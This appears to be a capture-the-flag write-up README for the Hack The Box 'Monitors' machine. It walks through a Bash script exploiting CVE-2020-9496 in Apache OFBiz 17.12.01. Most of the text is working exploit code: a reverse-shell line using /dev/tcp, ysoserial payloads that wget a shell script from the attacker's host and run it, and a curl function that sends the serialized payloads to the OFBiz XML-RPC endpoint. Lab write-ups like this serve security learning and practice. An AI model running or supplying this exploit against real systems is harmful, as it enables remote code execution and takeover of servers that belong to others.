# Hack The Box. Machines. Monitors

Machine write-up: https://7rocky.github.io/en/htb/monitors

### `deserialization.sh`

This Bash script is the result of putting together all the steps found in the [CVE-2020-9496](https://github.com/g33xter/CVE-2020-9496) to exploit Apache OFBiz version 17.12.01.

The exploiting process requires to have a web server on port 80 (using Python, for example).

It also requires to have a JAR file for [ysoserial](https://github.com/frohoff/ysoserial).

Basically, the script receives three parameters:

```bash
ip=$1
port=$2
yss_path=$3
```

The IP address and port where to listen with `nc`, and the path to the JAR file for [ysoserial](https://github.com/frohoff/ysoserial).

Then, the script itself will create a file called `shell.sh` with a reverse shell payload:

```bash
echo "bash -i >& /dev/tcp/$ip/$port 0>&1" > shell.sh
```

And after that, generate the payloads needed to exlpoit the insecure deserialization vulnerability of OFBiz:

```bash
first=`java -jar $yss_path CommonsBeanutils1 "wget $ip/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"` 
second=`java -jar $yss_path CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n"`
```

These payloads must be inserted inside an XML document and sent to `/webtools/control/xmlrpc`. Since there are two payloads, the best is to write a function and call it twice:

```bash
function send_payload() {
  curl https://127.0.0.1:8443/webtools/control/xmlrpc -d \
"<?xml version=\"1.0\"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">$1</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>" -skH 'Content-Type: application/xml' >/dev/null
}
```

After that, we call the function providing the two previous payloads (waiting some time between both requests) and remove the `shell.sh` file:

```bash
send_payload $first
sleep 2
send_payload $second

rm shell.sh
```
